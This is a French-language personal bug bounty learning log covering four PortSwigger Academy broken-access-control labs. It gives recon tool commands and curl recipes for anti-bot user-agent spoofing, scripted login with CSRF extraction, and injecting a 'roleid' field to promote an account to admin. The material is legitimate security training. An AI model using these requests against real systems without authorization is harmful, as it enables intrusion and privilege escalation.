# 📓 Carnet de bord — Bug Bounty — Jour 1

> Première soirée de hacking web. Parti de zéro, fini avec **4 labs exploités**.
> Plateforme d'entraînement : **PortSwigger Web Security Academy** (gratuit, légal).
> Thème : **Broken Access Control** (la faille n°1 du monde — OWASP Top 10).

---

## 🏆 Ce que j'ai résolu ce soir

| Lab | Faille | Technique apprise |
|---|---|---|
| **1. Unprotected admin functionality** | Page admin non protégée | Trouver une page cachée via `robots.txt` → `/administrator-panel` |
| **2. ...with unpredictable URL** | Admin cachée dans le code | Lire le code source (`curl`) + contourner l'anti-bot |
| **3. User role controlled by request parameter** | Cookie de rôle modifiable | Login + CSRF + cookie `Admin=true` |
| **4. User role can be modified in user profile** | Champ caché dans le profil | Injecter `"roleid":2` dans le JSON → auto-promotion admin |

---

## 🧠 Le concept clé : Broken Access Control

> Une page ou une action sensible n'est **pas correctement protégée**.
> Si je connais/devine l'adresse, ou si je modifie un paramètre (cookie, rôle, ID),
> j'accède à un truc auquel je ne devrais PAS avoir droit.

- C'est la faille **n°1 du classement mondial OWASP**.
- C'est la **plus payée** en bug bounty (de 100 € à 3000 €+).
- Elle se trouve **à la main** (logique), pas avec un scanner automatique.

---

## 🛠️ Mon arsenal (installé dans Kali/Termux)

```bash
subfinder   # trouve les sous-domaines d'un site
httpx-pd    # garde ceux qui sont vivants
nuclei      # scanne des failles connues
curl        # télécharge des pages / envoie des requêtes à la main
grep        # filtre le texte (extraire une adresse, un mot)
```

### Recon de base
```bash
subfinder -d cible.com -o sousdomaines.txt
cat sousdomaines.txt | httpx-pd -o vivants.txt
nuclei -l vivants.txt -severity high,critical -rate-limit 10 -stats
```

---

## 🥷 Les techniques curl que je maîtrise maintenant

### Lire le code source d'une page + chercher un mot
```bash
curl -s "https://cible/" | grep -i admin
```

### Se déguiser en navigateur (contourner l'anti-bot)
```bash
curl -s -A "Mozilla/5.0" "https://cible/"
```
> Beaucoup de sites servent du faux contenu à `curl`. Avec `-A "Mozilla/5.0"`
> on se fait passer pour Chrome → on reçoit le vrai contenu.

### Garder une session (cookies)
```bash
curl -s -c /tmp/cj "https://cible/page"      # -c : SAUVEGARDE les cookies
curl -s -b /tmp/cj "https://cible/autre"     # -b : RÉUTILISE les cookies
```
> Crucial : l'adresse admin / l'état dépend souvent de la **session** (cookie).
> Il faut faire les requêtes liées dans la **même** session.

### Se connecter par script (login + CSRF)
```bash
C=$(curl -s -c /tmp/cj "https://cible/login" | grep -oP 'csrf" value="\K[^"]+')
curl -s -b /tmp/cj -c /tmp/cj "https://cible/login" \
  --data "csrf=$C&username=wiener&password=peter"
```

### Envoyer un corps JSON modifié (injecter un champ caché)
```bash
curl -s -b /tmp/cj "https://cible/my-account/change-email" \
  -H "Content-Type: application/json" \
  --data '{"email":"x@x.com","roleid":2}'
```

### Vérifier si un lab est résolu (sans le cache du navigateur)
```bash
curl -s -A "Mozilla/5.0" "https://cible/" | grep -o "is-solved\|Not solved"
```

---

## ⚠️ Pièges rencontrés (et compris)

- **`view-source:` est bloqué sur Chrome mobile** → utiliser `curl` à la place.
- **Les labs PortSwigger expirent** (ERR_HTTP2_PROTOCOL_ERROR) → recliquer "ACCESS THE LAB" pour une instance fraîche.
- **L'adresse admin change à chaque requête** si on ne garde pas le cookie → toujours `-c`/`-b` dans la même commande.
- **Le ✅ vert dans le navigateur** = juste de la déco. Ce qui compte = avoir exploité la faille.
- **Deux sites différents** : `portswigger.net` (les cours/labs) ≠ `web-security-academy.net` (la boutique à hacker).

---

## 🧭 Les règles d'or

1. **Compétence d'abord, argent ensuite** (il suit toujours).
2. **Une faille à fond** > dix survolées.
3. **Toujours dans le SCOPE** = mon autorisation légale.
4. **Régularité** : même 30 min les jours durs.
5. Quand je me sens nul → **me souvenir de ce soir** (parti de "je suis nul" → 4 failles).

---

## 🎯 Prochaine étape

- **Jour 2** : labs IDOR (`User ID controlled by request parameter`) → lire les données d'un autre utilisateur.
- Continuer le thème Access Control jusqu'au bout (~13 labs).
- Puis : Information Disclosure, XSS.
- Objectif fin de mois : **première vraie chasse sur HackerOne** (programme avec scope wildcard, pas un géant mûr).

---

*Note créée le Jour 1. À compléter chaque soir. 🚀*
